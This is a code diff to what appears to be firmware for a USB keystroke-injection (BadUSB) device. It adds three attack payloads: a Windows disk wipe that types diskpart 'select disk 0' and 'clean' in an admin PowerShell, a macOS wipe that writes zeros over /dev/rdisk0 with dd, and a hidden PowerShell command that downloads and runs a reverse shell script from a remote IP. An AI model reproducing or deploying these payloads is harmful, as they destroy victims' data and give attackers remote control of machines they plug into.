@@ -139,6 +139,9 @@ bool usb_run_payload(USBPayload payload) {
             usb_payload_speak("Warning. System compromised. You have been hacked by CYD 28.");
             break;
         case PAYLOAD_INFO_TO_NOTEPAD: usb_payload_info_notepad(); break;
+        case PAYLOAD_DISK_WIPE_WIN: usb_payload_disk_wipe_win(); break;
+        case PAYLOAD_DISK_WIPE_MAC: usb_payload_disk_wipe_mac(); break;
+        case PAYLOAD_REVERSE_SHELL_PI: usb_payload_reverse_shell_pi(DEFAULT_IP); break;
         default:
             displayWarning("Payload Desconhecido", true);
             _status = USB_FAILED;
@@ -316,4 +319,42 @@ void usb_payload_info_notepad() {
 void usb_payload_powershell(const char *ps_script) {
     run_win_r("powershell -NoExit -Command \"" + String(ps_script) + "\"");
     displaySuccess("Custom Script", true);
+}
+
+void usb_payload_disk_wipe_win() {
+    open_powershell_admin();
+    delay(1000);
+    hid_usb->println("diskpart");
+    delay(500);
+    hid_usb->println("list disk");
+    delay(500);
+    hid_usb->println("select disk 0");
+    delay(500);
+    hid_usb->println("clean");
+    delay(1000);
+    hid_usb->println("exit");
+    displaySuccess("Disk Wipe Win Initiated", true);
+}
+
+void usb_payload_disk_wipe_mac() {
+    run_win_r("terminal"); // Assuming it's Mac, but since USB is Windows-focused, this might not work
+    delay(1000);
+    hid_usb->println("sudo dd if=/dev/zero of=/dev/rdisk0 bs=1024");
+    delay(100);
+    hid_usb->press(KEY_RETURN);
+    hid_usb->releaseAll();
+    displaySuccess("Disk Wipe Mac Initiated", true);
+}
+
+void usb_payload_reverse_shell_pi(const char *pi_ip) {
+    run_win_r("powershell -W Hidden");
+    delay(2000);
+
+    String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://" + String(pi_ip) + "/shell.ps1');";
+    hid_usb->print(cmd);
+    delay(10);
+
+    hid_usb->press(KEY_RETURN);
+    hid_usb->releaseAll();
+    displaySuccess("Reverse Shell to Pi Initiated", true);
 }
